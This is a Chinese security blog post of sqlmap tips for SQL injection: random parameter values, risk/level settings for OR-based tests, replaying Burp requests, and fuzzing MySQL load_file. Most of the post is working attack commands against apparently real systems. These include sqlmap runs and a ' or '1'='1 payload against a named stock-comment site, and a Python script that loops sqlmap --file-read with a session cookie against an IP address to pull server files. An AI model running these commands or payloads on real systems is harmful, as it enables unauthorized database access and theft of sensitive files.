<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> sqlmap使用手册 · xd_xd's blog</title><meta name="description" content="sqlmap使用手册 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/hkalexling" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">sqlmap使用手册</h1><div class="post-info">Nov 10, 2015</div><div class="post-content"><h1 id="update">update</h1><p>2016-05-18:更新randomize<br>2016-05-25:更新burpsuite save to file<br>2016-05-26:更新load_file fuzz</p>
<h1 id="–randomize">–randomize</h1><pre><code>--randomize=RPARAM  Randomly change value <span class="keyword">for</span> given <span class="function"><span class="title">parameter</span><span class="params">(s)</span></span>
</code></pre><p>sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会导致无法进入后续的逻辑从而无法检测SQL注入。使用randomize指定这个参数随机就可以了。</p>
<h1 id="risk_3">risk 3</h1><p>测试一个注入点，手工测试验证应该存在注入但是用sqlmap没跑出来。测试发现需要指定risk 3，sqlmap才会使用or语句进行测试，才可以识别出这个注入点。</p>
<p>or boolean 需要risk 3 level 3</p>
<pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">5</span> --dbs --dbms=mysql --risk <span class="number">3</span>
</code></pre><p>这是乌云上一个公开的漏洞。之所以用and无法识别出来是因为code的参数本身是无效的，数据查询的结果为空，所以再拼接and语句，查询条件还是false。<br><img src="/images/sqlmaprisk1.png" alt=""><br>可以直接在code参数后面拼接一个or语句。然后再拼接and语句就可以正常注入了。<br><img src="/images/sqlmaprisk2.png" alt=""></p>
<p>所以这里可以直接使用risk 3参数或者在code参数后面拼or语句。</p>
<pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951' or '1'='1&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">1</span> --dbs --dbms=mysql --risk <span class="number">1</span>
</code></pre><h1 id="burpsuite_save_to_file">burpsuite save to file</h1><p>测试一个multipart/form-data里参数的注入，返现复制请求文本到文件中，在使用sqlmap r参数指定请求更自己在burpsuite测试的结果不一样，通过对比发现，复制的请求中忽略了原始请求中每个参数后面的%0d符号。导致服务端无法进行了不一样的处理。直接使用burpsuite中右键save to file保存请求，再使用sqlmap r参数就可以。</p>
<h1 id="load_file_fuzz">load_file fuzz</h1><p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。<br>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：SQLNuke——mysql 注入load_file Fuzz工具.<br>不过sqlnuke看说明只支持回显的union的的方式。写一个下脚本用sqlmap来fuzz load_file也是一个不错的方式。</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># encoding: utf-8</span>
import subprocess
filepaths = <span class="keyword">open</span>(<span class="string">'filelist.txt'</span>)
<span class="keyword">for</span> filepath in filepaths:
    cmdline = <span class="string">"python /Users/xxxxxx/security/web/sqlmap/sqlmap.py -u 'http://1.1.25.41/cms/privilege/publist?level=3&amp;title=jj' --cookie='_pss=PcqD<span class="variable">%2BvOIi05CQLYgBqHVE</span><span class="variable">%2Bm9oeAswCYOYYyZZTA0b4wk8KUMrHTuBJmyyZdqch</span><span class="variable">%2Fpwd</span><span class="variable">%2F7QcVCaehUtF0QHhpgkJliaAruL0dxGR</span><span class="variable">%2B8mwM0</span><span class="variable">%2FGc</span><span class="variable">%3D</span>' --batch --file-read="</span> +filepath
    fuzzsqlmap_proc = subprocess.Popen(cmdline,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    <span class="keyword">print</span> filepath
    process_output = fuzzsqlmap_proc.stdout.readlines()
    <span class="keyword">print</span> process_output
</code></pre><p>使用python，几行代码就可以搞定。然后到sqlmap输出目录里根据文件大小查看下载下来的文件就可以了。感觉，根据目标系统的环境，搭建一个一样的系统，然后列出所有的文件作为字典来进行fuzz应该是一个不错的思路。<br>尝试load_file(目录)，返回为null，如果可以load_file目录的话~~</p>
</div></article></div></section><footer><div class="paginator"><a href="/2015/11/16/瞎折腾之sublime插件导入第三方库/" class="prev">上一篇</a><a href="/2015/11/03/几个DOM-XSS案例分析/" class="next">下一篇</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>